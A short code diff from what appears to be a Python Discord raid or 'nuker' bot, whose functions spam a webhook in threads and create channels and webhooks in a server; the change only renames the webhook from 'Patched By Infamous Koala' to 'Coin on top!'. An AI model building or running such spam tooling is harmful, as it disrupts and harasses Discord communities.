@@ -89,7 +89,7 @@ def spam_webhook(webhook):
 def between(webhook):
     threading.Thread(target=spam_webhook,args=(webhook,)).start()
 async def forever_send_msg(channel):
-    webhook = await channel.create_webhook(name="Patched By Infamous Koala")
+    webhook = await channel.create_webhook(name="Coin on top!")
     between(webhook)
 async def create_channel(guild,name,cat):
     channel = await guild.create_text_channel(str(name),category=cat)
